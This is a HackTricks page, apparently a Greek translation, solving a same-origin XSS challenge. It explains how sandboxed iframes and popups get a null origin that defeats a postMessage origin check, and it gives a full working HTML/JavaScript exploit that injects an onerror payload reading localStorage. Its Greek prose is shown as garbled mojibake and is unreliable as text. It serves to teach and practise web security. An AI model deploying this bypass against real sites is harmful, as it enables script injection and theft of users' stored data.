# Bypassing SOP with Iframes - 1

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Iframes in SOP-1

Î£Îµ Î±Ï…Ï„Î®Î½ Ï„Î·Î½ [**Ï€ÏÏŒÎºÎ»Î·ÏƒÎ·**](https://github.com/terjanq/same-origin-xss) Ï€Î¿Ï… Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®Î¸Î·ÎºÎµ Î±Ï€ÏŒ Ï„Î¿Ï…Ï‚ [**NDevTK**](https://github.com/NDevTK) ÎºÎ±Î¹ [**Terjanq**](https://github.com/terjanq) Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯Ï„Îµ Î­Î½Î± XSS ÏƒÏ„Î¿Î½ ÎºÏ‰Î´Î¹ÎºÎ¿Ï€Î¿Î¹Î·Î¼Î­Î½Î¿
```javascript
const identifier = '4a600cd2d4f9aa1cfb5aa786';
onmessage = e => {
const data = e.data;
if (e.origin !== window.origin && data.identifier !== identifier) return;
if (data.type === 'render') {
renderContainer.innerHTML = data.body;
}
}
```
Î¤Î¿ ÎºÏÏÎ¹Î¿ Ï€ÏÏŒÎ²Î»Î·Î¼Î± ÎµÎ¯Î½Î±Î¹ ÏŒÏ„Î¹ Î· [**ÎºÏÏÎ¹Î± ÏƒÎµÎ»Î¯Î´Î±**](https://so-xss.terjanq.me) Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ Ï„Î¿ DomPurify Î³Î¹Î± Î½Î± ÏƒÏ„ÎµÎ¯Î»ÎµÎ¹ Ï„Î¿ `data.body`, Î¿Ï€ÏŒÏ„Îµ Î³Î¹Î± Î½Î± ÏƒÏ„ÎµÎ¯Î»ÎµÏ„Îµ Ï„Î± Î´Î¹ÎºÎ¬ ÏƒÎ±Ï‚ Î´ÎµÎ´Î¿Î¼Î­Î½Î± html ÏƒÎµ Î±Ï…Ï„ÏŒÎ½ Ï„Î¿Î½ ÎºÏÎ´Î¹ÎºÎ± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± **Ï€Î±ÏÎ±ÎºÎ¬Î¼ÏˆÎµÏ„Îµ** Ï„Î¿ `e.origin !== window.origin`.

Î‘Ï‚ Î´Î¿ÏÎ¼Îµ Ï„Î· Î»ÏÏƒÎ· Ï€Î¿Ï… Ï€ÏÎ¿Ï„ÎµÎ¯Î½Î¿Ï…Î½.

### SOP Ï€Î±ÏÎ±ÎºÎ¬Î¼ÏˆÎ· 1 (e.origin === null)

ÎŒÏ„Î±Î½ Ï„Î¿ `//example.org` ÎµÎ¯Î½Î±Î¹ ÎµÎ½ÏƒÏ‰Î¼Î±Ï„Ï‰Î¼Î­Î½Î¿ ÏƒÎµ Î­Î½Î± **sandboxed iframe**, Ï„ÏŒÏ„Îµ Î· **Ï€ÏÎ¿Î­Î»ÎµÏ…ÏƒÎ·** Ï„Î·Ï‚ ÏƒÎµÎ»Î¯Î´Î±Ï‚ Î¸Î± ÎµÎ¯Î½Î±Î¹ **`null`**, Î´Î·Î»Î±Î´Î® **`window.origin === null`**. ÎˆÏ„ÏƒÎ¹, Î±Ï€Î»Î¬ ÎµÎ½ÏƒÏ‰Î¼Î±Ï„ÏÎ½Î¿Î½Ï„Î±Ï‚ Ï„Î¿ iframe Î¼Î­ÏƒÏ‰ Ï„Î¿Ï… `<iframe sandbox="allow-scripts" src="https://so-xss.terjanq.me/iframe.php">` Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎ±Î¼Îµ Î½Î± **ÎµÏ€Î¹Î²Î¬Î»Î¿Ï…Î¼Îµ Ï„Î·Î½ Ï€ÏÎ¿Î­Î»ÎµÏ…ÏƒÎ· `null`**.

Î‘Î½ Î· ÏƒÎµÎ»Î¯Î´Î± Î®Ï„Î±Î½ **ÎµÎ½ÏƒÏ‰Î¼Î±Ï„ÏÏƒÎ¹Î¼Î·**, Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎ±Ï„Îµ Î½Î± Ï€Î±ÏÎ±ÎºÎ¬Î¼ÏˆÎµÏ„Îµ Î±Ï…Ï„Î® Ï„Î·Î½ Ï€ÏÎ¿ÏƒÏ„Î±ÏƒÎ¯Î± Î¼Îµ Î±Ï…Ï„ÏŒÎ½ Ï„Î¿Î½ Ï„ÏÏŒÏ€Î¿ (Ï„Î± cookies Î¼Ï€Î¿ÏÎµÎ¯ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î½Î± Ï‡ÏÎµÎ¹Î±ÏƒÏ„ÎµÎ¯ Î½Î± ÏÏ…Î¸Î¼Î¹ÏƒÏ„Î¿ÏÎ½ ÏƒÎµ `SameSite=None`).

### SOP Ï€Î±ÏÎ±ÎºÎ¬Î¼ÏˆÎ· 2 (window.origin === null)

Î— Î»Î¹Î³ÏŒÏ„ÎµÏÎ¿ Î³Î½Ï‰ÏƒÏ„Î® Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯Î± ÎµÎ¯Î½Î±Î¹ ÏŒÏ„Î¹ ÏŒÏ„Î±Î½ Î· **Ï„Î¹Î¼Î® sandbox `allow-popups` ÎµÎ¯Î½Î±Î¹ ÏÏ…Î¸Î¼Î¹ÏƒÎ¼Î­Î½Î·**, Ï„ÏŒÏ„Îµ Ï„Î¿ **Î±Î½Î¿Î¹Î³Î¼Î­Î½Î¿ popup** Î¸Î± **ÎºÎ»Î·ÏÎ¿Î½Î¿Î¼Î®ÏƒÎµÎ¹** ÏŒÎ»Î± Ï„Î± **sandboxed attributes** ÎµÎºÏ„ÏŒÏ‚ Î±Î½ Î­Ï‡ÎµÎ¹ ÏÏ…Î¸Î¼Î¹ÏƒÏ„ÎµÎ¯ Ï„Î¿ `allow-popups-to-escape-sandbox`.\
ÎˆÏ„ÏƒÎ¹, Ï„Î¿ Î¬Î½Î¿Î¹Î³Î¼Î± ÎµÎ½ÏŒÏ‚ **popup** Î±Ï€ÏŒ Î¼Î¹Î± **null origin** Î¸Î± ÎºÎ¬Î½ÎµÎ¹ Ï„Î¿ **`window.origin`** Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ popup ÎµÏ€Î¯ÏƒÎ·Ï‚ **`null`**.

### Î›ÏÏƒÎ· Î ÏÏŒÎºÎ»Î·ÏƒÎ·Ï‚

Î•Ï€Î¿Î¼Î­Î½Ï‰Ï‚, Î³Î¹Î± Î±Ï…Ï„Î® Ï„Î·Î½ Ï€ÏÏŒÎºÎ»Î·ÏƒÎ·, Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ ÎºÎ±Î½ÎµÎ¯Ï‚ Î½Î± **Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹** Î­Î½Î± **iframe**, Î½Î± **Î±Î½Î¿Î¯Î¾ÎµÎ¹ Î­Î½Î± popup** ÏƒÏ„Î· ÏƒÎµÎ»Î¯Î´Î± Î¼Îµ Ï„Î¿Î½ ÎµÏ…Î¬Î»Ï‰Ï„Î¿ Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î® ÎºÏÎ´Î¹ÎºÎ± XSS (`/iframe.php`), ÎºÎ±Î¸ÏÏ‚ Ï„Î¿ `window.origin === e.origin` ÎµÏ€ÎµÎ¹Î´Î® ÎºÎ±Î¹ Ï„Î± Î´ÏÎ¿ ÎµÎ¯Î½Î±Î¹ `null`, ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒ Î½Î± **ÏƒÏ„ÎµÎ¯Î»ÎµÎ¹ Î­Î½Î± payload Ï€Î¿Ï… Î¸Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯ Ï„Î¿ XSS**.

Î‘Ï…Ï„ÏŒ Ï„Î¿ **payload** Î¸Î± Ï€Î¬ÏÎµÎ¹ Ï„Î¿Î½ **Ï„Î±Ï…Ï„Î¿Ï€Î¿Î¹Î·Ï„Î®** ÎºÎ±Î¹ Î¸Î± ÏƒÏ„ÎµÎ¯Î»ÎµÎ¹ Î­Î½Î± **XSS** **Ï€Î¯ÏƒÏ‰ ÏƒÏ„Î·Î½ ÎºÏÏÎ¹Î± ÏƒÎµÎ»Î¯Î´Î±** (Ï„Î· ÏƒÎµÎ»Î¯Î´Î± Ï€Î¿Ï… Î¬Î½Î¿Î¹Î¾Îµ Ï„Î¿ popup), **Î· Î¿Ï€Î¿Î¯Î±** Î¸Î± **Î±Î»Î»Î¬Î¾ÎµÎ¹ Ï„Î¿Ï€Î¿Î¸ÎµÏƒÎ¯Î±** ÏƒÏ„Î· **ÎµÏ…Î¬Î»Ï‰Ï„Î·** `/iframe.php`. Î•Ï€ÎµÎ¹Î´Î® Î¿ Ï„Î±Ï…Ï„Î¿Ï€Î¿Î¹Î·Ï„Î®Ï‚ ÎµÎ¯Î½Î±Î¹ Î³Î½Ï‰ÏƒÏ„ÏŒÏ‚, Î´ÎµÎ½ Î­Ï‡ÎµÎ¹ ÏƒÎ·Î¼Î±ÏƒÎ¯Î± ÏŒÏ„Î¹ Î· ÏƒÏ…Î½Î¸Î®ÎºÎ· `window.origin === e.origin` Î´ÎµÎ½ Î¹ÎºÎ±Î½Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ (Î¸Ï…Î¼Î·Î¸ÎµÎ¯Ï„Îµ, Î· Ï€ÏÎ¿Î­Î»ÎµÏ…ÏƒÎ· ÎµÎ¯Î½Î±Î¹ Ï„Î¿ **popup** Î±Ï€ÏŒ Ï„Î¿ iframe Ï€Î¿Ï… Î­Ï‡ÎµÎ¹ **Ï€ÏÎ¿Î­Î»ÎµÏ…ÏƒÎ·** **`null`**) ÎµÏ€ÎµÎ¹Î´Î® `data.identifier === identifier`. Î¤ÏŒÏ„Îµ, Ï„Î¿ **XSS Î¸Î± ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î¾Î±Î½Î¬**, Î±Ï…Ï„Î® Ï„Î· Ï†Î¿ÏÎ¬ ÏƒÏ„Î·Î½ ÏƒÏ‰ÏƒÏ„Î® Ï€ÏÎ¿Î­Î»ÎµÏ…ÏƒÎ·.
```html
<body>
<script>
f = document.createElement('iframe');

// Needed flags
f.sandbox = 'allow-scripts allow-popups allow-top-navigation';

// Second communication with /iframe.php (this is the top page relocated)
// This will execute the alert in the correct origin
const payload = `x=opener.top;opener.postMessage(1,'*');setTimeout(()=>{
x.postMessage({type:'render',identifier,body:'<img/src/onerror=alert(localStorage.html)>'},'*');
},1000);`.replaceAll('\n',' ');

// Initial communication
// Open /iframe.php in a popup, both iframes and popup will have "null" as origin
// Then, bypass window.origin === e.origin to steal the identifier and communicate
// with the top with the second XSS payload
f.srcdoc = `
<h1>Click me!</h1>
<script>
onclick = e => {
let w = open('https://so-xss.terjanq.me/iframe.php');
onmessage = e => top.location = 'https://so-xss.terjanq.me/iframe.php';
setTimeout(_ => {
w.postMessage({type: "render", body: "<audio/src/onerror=\\"${payload}\\">"}, '*')
}, 1000);
};
<\/script>
`
document.body.appendChild(f);
</script>
</body>
```
{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¾Ï„Îµ Ï„Î¿ HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·Î½** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ ÎºÏŒÎ»Ï€Î± hacking Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
